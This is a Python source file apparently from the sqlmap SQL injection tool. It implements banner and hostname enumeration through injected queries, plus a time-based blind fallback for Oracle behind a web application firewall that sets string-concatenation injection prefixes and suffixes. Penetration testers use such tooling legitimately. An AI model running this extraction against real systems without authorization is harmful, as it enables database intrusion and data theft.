#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

from lib.core.common import Backend
from lib.core.common import getSortedInjectionTests
from lib.core.common import hashDBRetrieve
from lib.core.common import initTechnique
from lib.core.common import setTechnique
from lib.core.common import unArrayizeValue
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.enums import HASHDB_KEYS
from lib.core.enums import PAYLOAD
from lib.core.session import setOs
from lib.parse.banner import bannerParser
from lib.request import inject
from plugins.generic.custom import Custom
from plugins.generic.databases import Databases
from plugins.generic.entries import Entries
from plugins.generic.search import Search
from plugins.generic.users import Users

class Enumeration(Custom, Databases, Entries, Search, Users):
    """
    This class defines generic enumeration functionalities for plugins.
    """

    def __init__(self):
        kb.data.has_information_schema = False
        kb.data.banner = None
        kb.data.hostname = ""
        kb.data.processChar = None

        Custom.__init__(self)
        Databases.__init__(self)
        Entries.__init__(self)
        Search.__init__(self)
        Users.__init__(self)

    def getBanner(self):
        if not conf.getBanner:
            return

        if kb.data.banner is None:
            infoMsg = "fetching banner"
            logger.info(infoMsg)

            if Backend.isDbms(DBMS.DB2):
                rootQuery = queries[DBMS.DB2].banner
                for query in (rootQuery.query, rootQuery.query2):
                    kb.data.banner = unArrayizeValue(inject.getValue(query, safeCharEncode=False))
                    if kb.data.banner:
                        break
            else:
                query = queries[Backend.getIdentifiedDbms()].banner.query
                kb.data.banner = unArrayizeValue(inject.getValue(query, safeCharEncode=False))

            bannerParser(kb.data.banner)

            if conf.os and conf.os == "windows":
                kb.bannerFp["type"] = set(["Windows"])

            elif conf.os and conf.os == "linux":
                kb.bannerFp["type"] = set(["Linux"])

            elif conf.os:
                kb.bannerFp["type"] = set(["%s%s" % (conf.os[0].upper(), conf.os[1:])])

            if conf.os:
                setOs()

        return kb.data.banner

    def getHostname(self):
        infoMsg = "fetching server hostname"
        logger.info(infoMsg)

        hostnameQuery = queries[Backend.getIdentifiedDbms()].hostname
        query = hostnameQuery.query

        if not kb.data.hostname:
            kb.data.hostname = unArrayizeValue(inject.getValue(query, safeCharEncode=False))

        # Ghauri extraction fallback when hostname empty and Oracle + WAF
        waf_detected = (getattr(kb, 'identifiedWafs', None) and kb.identifiedWafs) or hashDBRetrieve(HASHDB_KEYS.CHECK_WAF_RESULT, True)
        ghauri_test = None
        if not kb.data.hostname and waf_detected and Backend.getIdentifiedDbms() == DBMS.ORACLE:
            for test in getSortedInjectionTests():
                if not (hasattr(test, "stype") and test.stype == PAYLOAD.TECHNIQUE.TIME):
                    continue
                t = (getattr(test, "title", None) or "").lower()
                if "ghauri" in t and "dbms_pipe" in t:
                    ghauri_test = test
                    break
        if not kb.data.hostname and ghauri_test is not None:
            prev_data = kb.injection.data.get(PAYLOAD.TECHNIQUE.TIME)
            prev_prefix = getattr(kb.injection, "prefix", None)
            prev_suffix = getattr(kb.injection, "suffix", None)
            prev_clause = getattr(kb.injection, "clause", None)
            prev_time_sec = conf.timeSec
            try:
                kb.ghauriExtractionMode = True
                if waf_detected and conf.timeSec < 9:
                    conf.timeSec = 9
                for attr in ("templatePayload", "matchRatio", "comment", "payload", "trueCode", "falseCode"):
                    setattr(ghauri_test, attr, getattr(prev_data, attr, None) if prev_data else None)
                setTechnique(PAYLOAD.TECHNIQUE.TIME)
                kb.injection.data[PAYLOAD.TECHNIQUE.TIME] = ghauri_test
                kb.injection.prefix = "'||"
                kb.injection.suffix = "||'"
                if hasattr(ghauri_test, "clause") and ghauri_test.clause:
                    kb.injection.clause = ghauri_test.clause
                initTechnique(PAYLOAD.TECHNIQUE.TIME)
                logger.info("Ghauri extraction fallback: retrying hostname with simple delay threshold")
                for q in (query, getattr(hostnameQuery, "query2", None)):
                    if q:
                        kb.data.hostname = unArrayizeValue(inject.getValue(q, safeCharEncode=False))
                        if kb.data.hostname:
                            break
            finally:
                kb.ghauriExtractionMode = False
                conf.timeSec = prev_time_sec
                if prev_data is not None:
                    kb.injection.data[PAYLOAD.TECHNIQUE.TIME] = prev_data
                kb.injection.prefix = prev_prefix
                kb.injection.suffix = prev_suffix
                kb.injection.clause = prev_clause
                initTechnique(PAYLOAD.TECHNIQUE.TIME)

        return kb.data.hostname
